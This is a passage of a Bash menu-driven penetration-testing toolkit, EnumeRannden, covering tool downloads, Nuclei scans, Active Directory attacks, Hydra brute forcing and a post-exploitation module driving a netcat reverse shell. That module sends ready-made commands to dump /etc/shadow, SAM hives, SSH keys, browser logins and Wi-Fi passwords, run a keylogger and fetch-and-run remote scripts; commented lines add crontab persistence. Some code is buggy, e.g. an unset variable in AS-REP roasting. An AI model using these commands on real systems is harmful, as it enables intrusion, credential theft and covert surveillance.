                    case $ligolo_server_version in
                        1) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Linux Proxy - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz${NC}"
                            ;;
                        2) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Linux Proxy - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz${NC}"
                            ;;
                        3) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_proxy_0.6.1_windows_amd64.zip"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Windows Proxy - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.6.1_windows_amd64.zip${NC}"
                            ;;
                        4) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_windows_amd64.zip"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Windows Proxy - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_proxy_0.5.2_windows_amd64.zip${NC}"
                            ;;
                        5)
                            clear
                            return
                            ;;
                        *) 
                            echo "Invalid option"
                            ;;
                    esac
                    ;;
                2)
                    echo -e "${BLUE}Select Ligolo Server version to download:${NC}"
                    echo -e "1) Ligolo Agent V0.6.1 Linux"
                    echo -e "2) Ligolo Agent V0.5.2 Linux"
                    echo -e "3) Ligolo Agent V0.6.1 Windows"
                    echo -e "4) Ligolo Agent V0.5.2 Windows"
                    echo -e "5) Back to Main Menu"
                    read -e -p "Enter your choice: " ligolo_client_version
                    case $ligolo_client_version in
                        1) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_agent_0.6.1_linux_amd64.tar.gz"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Linux Agent - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.6.1_linux_amd64.tar.gz${NC}"
                            ;;
                        2) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Linux Agent - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz${NC}"
                            ;;
                        3) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_agent_0.6.1_windows_amd64.zip"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Windows Agent - V0.6.1) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.6.1_windows_amd64.zip${NC}"
                            ;;
                        4) 
                            wget -P "$BASE_DIR/tools" "https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip"
                            clear
                            echo -e "${GREEN}[+] Ligolo (Windows Agent - V0.5.2) downloaded and saved as $BASE_DIR/tools/ligolo-ng_agent_0.5.2_windows_amd64.zip${NC}"
                            ;;
                        5)
                            clear
                            return
                            ;;
                        *) 
                            echo "Invalid option"
                            ;;
                    esac
                    ;;
                3)
                    clear
                    return
                    ;;
                *) echo "Invalid option" ;;
            esac
            ;;
        4)
            wget -P "$BASE_DIR/tools" "https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe"
            clear
            echo -e "${GREEN}[+] WinPEAS downloaded and saved as $BASE_DIR/tools/winPEASx64.exe${NC}"
            ;;
        5)
            wget -P "$BASE_DIR/tools" "https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/linpeas_linux_amd64"
            clear
            echo -e "${GREEN}[+] LinPEAS downloaded and saved as $BASE_DIR/tools/linpeas_linux_amd64${NC}"
            ;;
        6)
            clear
            main_menu
            ;;
        *)
            echo -e "${RED}[-] Invalid option.${NC}"
            ;;
    esac
}


# Function for Exploit Tools submenu
exploit_tools_menu() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select an Exploit Tools Option:${NC}"
        echo -e "1) Generate payloads"
        echo -e "2) Searchsploit"
        echo -e "3) Back to Main Menu"
        read -e -p "Option: " exploit_tools_option

        clear
        case $exploit_tools_option in
            1)
                generate_payloads
                ;;
            2)
                read -e -p "Enter the text to search: " search_term
                clear
                searchsploit "$search_term" > "${BASE_DIR}/exploits/searchsploit_results_${search_term}.txt"
                last_output=$(cat "${BASE_DIR}/exploits/searchsploit_results_${search_term}.txt")
                cat "${BASE_DIR}/exploits/searchsploit_results_${search_term}.txt"
                ;;
            3)
                clear
                break
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
    done
}

# Function to sanitize filenames
sanitize_filename() {
    echo "$1" | tr -d '\/\\'
}

# Function to perform OSINT with Nuclei
osint_nuclei() {
    show_info_panel
    read -e -p "Enter the target domain or IP: " target

    sanitized_target=$(sanitize_filename "$target")
    hora=$(date +"%m-%d-%H:%M")
    output_file="$BASE_DIR/osint/nuclei_${sanitized_target}_$hora"

    echo -e "${BLUE}Select the type of Nuclei scan:${NC}"
    echo -e "1) Basic Scan: A simple scan with default settings."
    echo -e "2) Silent Scan: A scan with no much noise."
    echo -e "3) Web Application Scan: Focuses on web vulnerabilities and default logins."
    echo -e "4) Network Infrastructure Scan: Scans for CVEs, misconfigurations, and exposed services."
    echo -e "5) Comprehensive Scan: A thorough scan including all types of vulnerabilities."
    echo -e "6) Custom Scan: Customize your scan with specific arguments."
    read -e -p "Scan Type: " scan_type

    options=""

    case $scan_type in
        1)
            options="-o $output_file"
            ;;
        2)
            options="-silent -o $output_file"
            ;;
        3)
            options="-t cves -t vulnerabilities -t default-logins -o $output_file"
            ;;
        4)
            options="-t cves -t misconfigurations -t default-logins -t exposed-panels -o $output_file"
            ;;
        5)
            options="-t cves -t vulnerabilities -t misconfigurations -t default-logins -t exposed-panels -t exposures -o $output_file"
            ;;
        6)
            echo -e "${BLUE}Select additional options for the Custom Scan:${NC}"
            echo -e "1) -nt: Run only new templates"
            echo -e "2) -tags: Templates to run based on tags"
            echo -e "3) -a: Templates to run based on authors"
            echo -e "4) -s: Templates to run based on severity"
            echo -e "5) -pt: Templates to run based on protocol type"
            echo -e "6) -rl: Maximum number of requests to send per second"
            echo -e "7) -timeout: Time to wait before timeout"
            echo -e "8) -retries: Number of retries for a failed request"
            echo -e "9) -bulk-size: Maximum number of hosts to be analyzed in parallel"
            echo -e "10) -jsonl: Write output in JSONL format"
            echo -e "11) -stats: Display statistics about the running scan"
            echo -e "12) -update: Update nuclei engine to the latest released version"
            echo -e "13) -ut: Update nuclei-templates to latest released version"
            echo -e "14) -json-export: Export results in JSON format"
            echo -e "15) -me: Export results in Markdown format"
            read -e -p "Enter the options you want to use (comma-separated): " nuclei_options

            if [ "$nuclei_options" != "1" ]; then
                IFS=',' read -ra opts <<< "$nuclei_options"
                for opt in "${opts[@]}"; do
                    case $opt in
                        1) options+=" -nt" ;;
                        2) read -e -p "Enter the tags: " tags; options+=" -tags $tags" ;;
                        3) read -e -p "Enter the authors: " authors; options+=" -a $authors" ;;
                        4) read -e -p "Enter the severity: " severity; options+=" -s $severity" ;;
                        5) read -e -p "Enter the protocol types: " protocol; options+=" -pt $protocol" ;;
                        6) read -e -p "Enter the rate limit: " rate; options+=" -rl $rate" ;;
                        7) read -e -p "Enter the timeout: " timeout; options+=" -timeout $timeout" ;;
                        8) read -e -p "Enter the number of retries: " retries; options+=" -retries $retries" ;;
                        9) read -e -p "Enter the bulk size: " bulk_size; options+=" -bulk-size $bulk_size" ;;
                        10) options+=" -jsonl" ;;
                        11) options+=" -stats" ;;
                        12) options+=" -update" ;;
                        13) options+=" -ut" ;;
                        14) options+=" -json-export $output_file.json" ;;
                        15) options+=" -me $output_file.md" ;;
                        *) echo -e "${RED}[-] Invalid option: $opt${NC}" ;;
                    esac
                done
            fi
            ;;
        *)
            echo -e "${RED}[-] Invalid scan type.${NC}"
            return
            ;;
    esac

    echo -e "${GREEN}[+] Running Nuclei with options: $options${NC}"
    nuclei -u "$target" $options
    echo -e "${GREEN}[+] Nuclei scan completed. Results saved in $output_file${NC}"
}

# Function to check if port 445 is open
check_port_445() {
    if [[ ! $OPEN_PORTS =~ "445" ]]; then
        echo -e "${YELLOW}[!] Warning: Port 445 is not detected as open.${NC}"
        read -e -p "Do you want to continue? (y/n): " choice
        if [[ $choice != "y" && $choice != "Y" ]]; then
            return 1
        fi
    fi
    return 0
}

# Function to show Active Directory tools
show_ad_tools() {
    check_port_445
    if [ $? -ne 0 ]; then
        return
    fi

    while true; do
        echo -e "${BLUE}[+] Active Directory Tools:${NC}"
        echo -e "1) BloodHound"
        echo -e "2) ldapsearch"
        echo -e "3) enum4linux"
        echo -e "4) Impacket"
        echo -e "5) CrackMapExec"
        echo -e "6) SMB Enumeration"
        echo -e "7) Kerberos Enumeration"
        echo -e "8) DNS Enumeration"
        echo -e "9) AS-REP Roasting"
        echo -e "10) Password Spraying"
        echo -e "11) SMB Relay Attack"
        echo -e "12) LDAP Enumeration"
        echo -e "13) Back to Main Menu"
        read -e -p "Select an option: " ad_option

        case $ad_option in
            1) run_bloodhound ;;
            2) run_ldapsearch ;;
            3) run_enum4linux ;;
            4) run_impacket ;;
            5) run_cme ;;
            6) smb_enumeration ;;
            7) kerberos_enumeration ;;
            8) dns_enumeration ;;
            9) asrep_roasting ;;
            10) password_spraying ;;
            11) smb_relay ;;
            12) ldap_enumeration ;;
            13) break ;;
            *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
        esac
    done
}

# Function to run BloodHound
run_bloodhound() {
    echo -e "${BLUE}[+] Running BloodHound...${NC}"
    sudo apt-get install bloodhound -y
    neo4j start
    bloodhound
}

# Function to run ldapsearch
run_ldapsearch() {
    read -e -p "Enter LDAP server address: " ldap_server
    read -e -p "Enter search base (e.g., dc=example,dc=com): " search_base
    echo -e "${BLUE}[+] Running ldapsearch...${NC}"
    ldapsearch -x -H ldap://$ldap_server -b $search_base
}

# Function to run enum4linux
run_enum4linux() {
    read -e -p "Enter target IP: " target_ip
    echo -e "${BLUE}[+] Running enum4linux...${NC}"
    enum4linux -a $target_ip
}

# Function to run Impacket tools
run_impacket() {
    echo -e "${BLUE}[+] Running Impacket tools...${NC}"
    echo -e "1) GetNPUsers"
    echo -e "2) GetUserSPNs"
    echo -e "3) SecretsDump"
    echo -e "4) SMBClient"
    read -e -p "Select an Impacket tool: " impacket_option

    case $impacket_option in
        1)
            read -e -p "Enter target IP: " target_ip
            read -e -p "Enter domain name: " domain
            read -e -p "Enter username: " username
            GetNPUsers.py $domain/$username -no-pass -dc-ip $target_ip
            ;;
        2)
            read -e -p "Enter target IP: " target_ip
            read -e -p "Enter domain name: " domain
            read -e -p "Enter username: " username
            GetUserSPNs.py $domain/$username -dc-ip $target_ip
            ;;
        3)
            read -e -p "Enter target IP: " target_ip
            read -e -p "Enter domain name: " domain
            read -e -p "Enter username: " username
            read -s -p "Enter password: " password
            secretsdump.py $domain/$username:$password@$target_ip
            ;;
        4)
            read -e -p "Enter target IP: " target_ip
            read -e -p "Enter domain name: " domain
            read -e -p "Enter username: " username
            read -s -p "Enter password: " password
            smbclient.py $domain/$username:$password@$target_ip
            ;;
        *)
            echo -e "${RED}Invalid option. Please try again.${NC}"
            ;;
    esac
}

# Function to run CrackMapExec
run_cme() {
    read -e -p "Enter target IP: " target_ip
    echo -e "${BLUE}[+] Running CrackMapExec...${NC}"
    crackmapexec smb $target_ip
}

# Function for SMB Enumeration
smb_enumeration() {
    read -e -p "Enter target IP: " target_ip
    echo -e "${BLUE}[+] Running SMB Enumeration...${NC}"
    smbclient -L \\$target_ip -N
}

# Function for Kerberos Enumeration
kerberos_enumeration() {
    read -e -p "Enter target IP: " target_ip
    echo -e "${BLUE}[+] Running Kerberos Enumeration...${NC}"
    nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='YOUR_REALM' $target_ip
}

# Function for DNS Enumeration
dns_enumeration() {
    read -e -p "Enter domain: " domain
    echo -e "${BLUE}[+] Running DNS Enumeration...${NC}"
    dnsrecon -d $domain
}

# Function for AS-REP Roasting
asrep_roasting() {
    read -e -p "Enter domain: " domain
    echo -e "${BLUE}[+] Running AS-REP Roasting...${NC}"
    GetNPUsers.py -dc-ip $target_ip -no-pass $domain/
}

# Function for Password Spraying
password_spraying() {
    read -e -p "Enter target IP: " target_ip
    read -e -p "Enter domain: " domain
    read -e -p "Enter username list file: " user_list
    read -s -p "Enter password: " password
    echo -e "\n${BLUE}[+] Running Password Spraying...${NC}"
    crackmapexec smb $target_ip -u $user_list -p $password
}

# Function for SMB Relay Attack
smb_relay() {
    read -e -p "Enter target IP: " target_ip
    echo -e "${BLUE}[+] Running SMB Relay Attack...${NC}"
    ntlmrelayx.py -smb2support -t $target_ip
}

# Function for LDAP Enumeration
ldap_enumeration() {
    read -e -p "Enter LDAP server address: " ldap_server
    echo -e "${BLUE}[+] Running LDAP Enumeration...${NC}"
    ldapsearch -x -H ldap://$ldap_server -b "dc=example,dc=com"
}

# Function for Hydra Brute Force Attack
brute_force_attack() {
    read -e -p "Enter the target IP: " target_ip

    echo -e "${BLUE}[+] Select the protocol to brute force:${NC}"
    protocols=("ssh" "ftp" "ftp" "mysql" "rdp")
    select protocol in "${protocols[@]}"; do
        case $protocol in
            ssh|ftp|smb|mysql|rdp)
                echo -e "${GREEN}Selected protocol: $protocol${NC}"
                break
                ;;
            *)
                echo -e "${RED}Invalid option. Please select a valid protocol.${NC}"
                ;;
        esac
    done

    read -e -p "Do you want to specify a username or use a user dictionary? (u/d): " user_choice
    if [ "$user_choice" == "u" ]; then
        read -e -p "Enter the username: " username
    else
        echo -e "${BLUE}[+] Select a user dictionary:${NC}"
        user_dictionaries=("/usr/share/metasploit-framework/data/wordlists/unix_users.txt" "/usr/share/metasploit-framework/data/wordlists/common_users.txt" "Custom")
        select user_dict in "${user_dictionaries[@]}"; do
            case $user_dict in
                "Custom")
                    read -e -p "Enter the path to the user dictionary: " user_dict
                    ;;
                *)
                    echo -e "${GREEN}Selected user dictionary: $user_dict${NC}"
                    ;;
            esac
            break
        done
    fi

    read -e -p "Do you want to specify a password or use a password dictionary? (p/d): " pass_choice
    if [ "$pass_choice" == "p" ]; then
        read -e -p "Enter the password: " password
    else
        echo -e "${BLUE}[+] Select a password dictionary:${NC}"
        pass_dictionaries=("/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt" "/usr/share/metasploit-framework/data/wordlists/common_passwords.txt" "/usr/share/wordlists/rockyou.txt" "Custom")
        select pass_dict in "${pass_dictionaries[@]}"; do
            case $pass_dict in
                "Custom")
                    read -e -p "Enter the path to the password dictionary: " pass_dict
                    ;;
                *)
                    echo -e "${GREEN}Selected password dictionary: $pass_dict${NC}"
                    ;;
            esac
            break
        done
    fi

    read -e -p "Enter the number of threads (default is 16, recommended up to 64): " threads
    threads=${threads:-16}

    fecha=$(date +%Y%m%d_%H%M%S)
    result_file="$BASE_DIR/loot/hydra_${protocol}_${fecha}.txt"

    echo -e "${YELLOW}[+] Starting $protocol brute force attack on $target_ip...${NC}"

    if [ "$user_choice" == "u" ]; then
        if [ "$pass_choice" == "p" ]; then
            hydra -l "$username" -p "$password" -t "$threads" -o "$result_file" "$protocol://$target_ip" 
        else
            hydra -l "$username" -P "$pass_dict" -t "$threads" -o "$result_file" "$protocol://$target_ip"
        fi
    else
        if [ "$pass_choice" == "p" ]; then
            hydra -L "$user_dict" -p "$password" -t "$threads" -o "$result_file" "$protocol://$target_ip"
        else
            hydra -L "$user_dict" -P "$pass_dict" -t "$threads" -o "$result_file" "$protocol://$target_ip"
        fi
    fi

    echo -e "${GREEN}[+] Brute force attack complete. Results saved to $result_file${NC}"
}

# Function for Port Knocking
port_knocking() {
    read -e -p "Enter the IP address to knock: " ip
    read -e -p "Enter the sequence of ports (example: 3000,4000,5000): " ports
    echo -e "${YELLOW}[+] Port knocking on $ip with ports $ports...${NC}"
    for port in ${ports//,/ }; do
        nc -zv $ip $port
    done
}

# Function to generate dictionary passwords using CUPP
generate_passwords_cupp() {
    # Ensure CUPP is available
    if [ ! -d "cupp" ]; then
        echo -e "${RED}[!] CUPP directory not found. Cloning CUPP from GitHub...${NC}"
        git clone https://github.com/Mebus/cupp.git || { echo -e "${RED}Failed to clone CUPP repository.${NC}"; return; }
    fi

    # Change to CUPP directory
    cd cupp || { echo -e "${RED}Failed to enter CUPP directory.${NC}"; return; }

    # Run CUPP with interactive mode
    echo -e "${BLUE}[+] Running CUPP...${NC}"
    python3 cupp.py -i

    # Return to the original directory
    cd ..
    echo -e "${GREEN}[+] CUPP dictionary will be saved at /cupp/name_of_the_person.txt directory...${NC}"
}

# Function to clean up and close the Netcat listener
cleanup() {
    echo -e "${RED}[+] Exiting ...${NC}"
    echo -e "${BLUE}[+] Thanks for use ${VIOLET}EnumeRannden${BLUE}!${NC}"
    tmux kill-session -t nc_listener 2>/dev/null
    exit 0
}

# Trap SIGINT (Ctrl + C) to run the cleanup function
trap cleanup SIGINT

# Function to handle post-exploitation tasks
post_exploitation() {
    echo -e "${BLUE}[+] Post-Exploitation Menu:${NC}"
    read -e -p "Enter the port to listen on: " listen_port
    echo -e "${BLUE}Setting up Netcat listener on port $listen_port...${NC}"

    # Create a new tmux session for the Netcat listener
    tmux new-session -d -s nc_listener "nc -lvnp $listen_port > /tmp/nc_output.txt"

    echo -e "${RED}You can now run the reverse shell... ${NC}"
    echo
    echo -e "${YELLOW}[+] Select a post-exploitation option: ${NC}"
    read -e -p "Is the shell Linux or Windows? (l/w): " shell_type
    echo
    while true; do
        echo -e "${BLUE}[+] Select a post-exploitation module: ${NC}"
        echo -e "1) Gather System Information"
        echo -e "2) Enumerate Users and Groups"
        echo -e "3) Check for Sudo Permissions"
        echo -e "4) Search for Sensitive Files"
        echo -e "5) Network Information"
        echo -e "6) Extract Password Hashes"
        echo -e "7) Keylogging (Only Linux Suported)"
        echo -e "8) Exploit Suggester LinPEAS / WinPEAS"
        echo -e "9) List Scheduled Tasks"
        echo -e "10) List Installed Software"
        echo -e "11) Collect Browser Data"
        echo -e "12) Dump SSH Keys"
        echo -e "13) Monitor Network Traffic"
        echo -e "14) Collect Wi-Fi Passwords"
        echo -e "15) List Running Processes"
        echo -e "16) Check for Virtual Machines"
        echo -e "17) Extract (Linux - SSH) / (Windows - RDP) Configuration"
        echo -e "18) Extract Environment Variables"
        echo -e "19) List Open Files"
        echo -e "20) Enumerate Installed Services"
        echo -e "21) Close Netcat Connection and Back to Main Menu"
        read -e -p "Select an option: " post_option

        if [ "$shell_type" == "l" ]; then
            case $post_option in
                1) send_command "uname -a && lsb_release -a" 2;;
                2) send_command "cat /etc/passwd && cat /etc/group" 2;;
                3) send_command "sudo -l" 2;;
                4) send_command "find / -type f -name '*password*'" 2;;
                5) send_command "ip a && ifconfig && netstat -an" 2;;
                # 6) send_command "wget -O /tmp/privesc.sh http://example.com/privesc.sh && bash /tmp/privesc.sh" 2;; #Cambiar url
                # 7) send_command "crontab -l && echo '*/5 * * * * /path/to/payload' | crontab -" 2;; #Cambiar directorio
                6) send_command "cat /etc/shadow" 2;;
                7) send_command "nohup /usr/bin/logger -t keylogger -p user.info $(xinput test-xi2 --root | grep --line-buffered RawKeyPress | sed 's/.*detail: //' | tr -d '[:blank:]' | tr '\n' ' ') &" 2;;
                8) send_command "wget -O /tmp/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/linpeas_linux_amd64 && bash /tmp/linpeas.sh" 2;;
                9) send_command "crontab -l && ls -al /etc/cron* && systemctl list-timers" 2;;
                10) send_command "dpkg -l || rpm -qa" 2;;
                11) send_command "find ~/.mozilla ~/.config/chromium -name '*.sqlite' -exec sqlite3 {} 'SELECT * FROM logins' \;" 2;;
                12) send_command "cat ~/.ssh/id_rsa" 2;; 
                13) send_command "tcpdump -i any -w /tmp/traffic.pcap && cat /tmp/traffic.pcap" 2;;
                14) send_command "grep -r '^psk=' /etc/NetworkManager/system-connections/" 2;;
                15) send_command "ps aux" 2;;
                16) send_command "dmesg | grep -i virtual && lscpu | grep Hypervisor" 2;;
                17) send_command "cat /etc/ssh/sshd_config" 2;;
                18) send_command "printenv" 2;;
                19) send_command "lsof" 2;;
                20) send_command "systemctl list-units --type=service" 2;;
                21) break ;;
                *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
            esac
        elif [ "$shell_type" == "w" ]; then
            case $post_option in
                1) send_command "systeminfo" 2;;
                2) send_command "net user && net localgroup" 2;;
                3) send_command "whoami /priv" 2;;
                4) send_command "dir /s /b *password*.txt" 2;;
                5) send_command "ipconfig /all && netstat -an" 2;;
                # 6) send_command "powershell -ep bypass -file C:\\path\\to\\privesc_script.ps1" 2;;
                # 7) send_command "schtasks /create /sc onlogon /tn MyTask /tr C:\\path\\to\\payload.exe" 2;;
                6) send_command "reg save hklm\\sam C:\\Windows\\Temp\\sam.save && reg save hklm\\system C:\\Windows\\Temp\\system.save" 2;;
                7) echo -e "${RED}Only Linux Suported.${NC}" ;;
                8) send_command "certutil.exe -urlcache -f https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe C:\\win.exe && powershell -ep bypass -file C:\\win.exe" 2;;
                9) send_command "schtasks /query /fo LIST /v" 2;;
                10) send_command "wmic product get name,version" 2;;
                11) send_command "powershell -ep bypass -file C:\\path\\to\\browser_data_collector.ps1" 2;; #Cambiar directorio
                12) send_command "type C:\\Users\\%USERNAME%\\.ssh\\id_rsa" 2;;
                13) send_command "powershell -ep bypass -file C:\\path\\to\\network_monitor.ps1" 2;; #Cambiar directorio
                14) send_command "netsh wlan show profile name=* key=clear" 2;;
                15) send_command "tasklist" 2;;   
                16) send_command "wmic computersystem get model" 2;;
                17) send_command "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"" 2;;
                18) send_command "set" 2;;
                19) send_command "net file" 2;;
                20) send_command "net start" 2;;
                21) break ;;
                *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
            esac
        else
            echo -e "${RED}Invalid shell type. Please enter 'l' for Linux or 'w' for Windows.${NC}"
        fi

        # Display the output from the reverse shell
        echo -e "${VIOLET}\n\n\n=========================================================================="
        echo -e "============================ ${YELLOW}Used module: ($post_option) ${VIOLET}============================"
        echo -e "==========================================================================${NC}"
        echo -e "${GREEN}"
        sed '$d' /tmp/nc_output.txt
        echo -e "${NC}"
        echo
        echo "" > /tmp/nc_output.txt
    done

    # Kill the tmux session after post-exploitation tasks are done
    tmux kill-session -t nc_listener
}

# Function to send command to the reverse shell
send_command() {
    local cmd="$1"
    local delay="$2"
    clear
    tmux send-keys -t nc_listener "$cmd" C-m
    echo -e "${YELLOW}[+] Waiting for $delay seconds...${NC}"

    # Countdown timer
    for ((i = delay; i > 0; i--)); do
        echo -ne "$i\033[0K\r"
        sleep 1
    done

    echo -e "${GREEN}[+] Capturing output...${NC}"
}

check_install_dependencies() {
    dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "nuclei" "tmux" "wkhtmltopdf")

    echo -e "${BLUE}[+] Checking and installing dependencies...${NC}"

    for dep in "${dependencies[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo -e "${YELLOW}[-] $dep is not installed. Installing...${NC}"
            if [[ $dep == "theharvester" ]]; then
                pip install theHarvester
            elif [[ $dep == "nuclei" || $dep == "finalrecon" || $dep == "tmux" ]]; then
                sudo apt install -y $dep
            else
                sudo apt-get install -y $dep
            fi
        else
            echo -e "${GREEN}[+] $dep is already installed.${NC}"
        fi
    done

    if ! command -v spiderfoot &> /dev/null; then
        echo -e "${YELLOW}[-] spiderfoot is not installed. Installing...${NC}"
        pipx install spiderfoot
    else
        echo -e "${GREEN}[+] spiderfoot is already installed.${NC}"
    fi
    clear
    echo -e "${GREEN}[+] All dependencies are checked and installed.${NC}"
}

# Principal function
main_menu() {
    while true; do
        show_info_panel
        echo -e "${BLUE}[+] Select an Option:${NC}"
        echo -e "1) Configure IP"
        echo -e "2) Create directories"
        echo -e "3) NMAP scans"
        echo -e "4) Web Tools"
        echo -e "5) Brute Force Attack"
        echo -e "6) Create a Presonalized Dictionary"
        echo -e "7) Port Knocking"
        echo -e "8) OSINT Tools"
        echo -e "9) Exploit Tools"
        echo -e "10) CheatSheets"
        echo -e "11) Hash Crack"
        echo -e "12) Active Directory Tools"
        echo -e "13) Reverse Shell Generator"
        echo -e "14) Post-Explotation"
        echo -e "15) Download Tools"
        echo -e "16) Generate Report"
        echo -e "17) Check and Install Dependencies"
        echo -e "18) Save & Exit"
        read -e -p "Option: " main_option

        clear
        case $main_option in
            1)
                set_ip
                save_results
                ;;
            2)
                create_directories
                save_results
                ;;
            3)
                scan_nmap
                ;;   
            4)
                web_tools_menu
                ;;
            5)
                brute_force_attack
                ;;
            6)
                generate_passwords_cupp
                ;;
            7)
                port_knocking
                ;;
            8)
                osint_tools_menu
                ;;
            9)
                exploit_tools_menu
                ;;
            10)
                show_cheatsheets
                ;;
            11)
                crack_with_hashcat
                ;;
            12)
                show_ad_tools
                ;;
            13)
                generate_reverse_shell
                ;;
            14) 
                post_exploitation
                ;;
            15)
                download_tools
                ;;
            16)
                save_report
                ;;
            17)
                check_install_dependencies
                ;;
            18)
                save_results
                echo -e "${GREEN}[+] Exiting the script.${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[-] Invalid option.${NC}"
                ;;
        esac
        echo -e "${last_output}"
    done
}

# Show banner at script start
show_banner

# Check if script is run without -c argument
if [[ "$1" != "-c" ]]; then
    create_directories
fi

# Check the arguments
while getopts ":c:h" opt; do
    case ${opt} in
        c )
            load_results "$OPTARG"
            ;;
        h )
            show_help
            exit 0
            ;;
        \? )
            echo -e "${RED}[-] Invalid option: -$OPTARG${NC}" >&2
            show_help
            exit 1
            ;;
        : )
            echo -e "${RED}[-] The Option -$OPTARG requires an argument.${NC}" >&2
            show_help
            exit 1
            ;;
    esac
done

# Run the main menu
main_menu
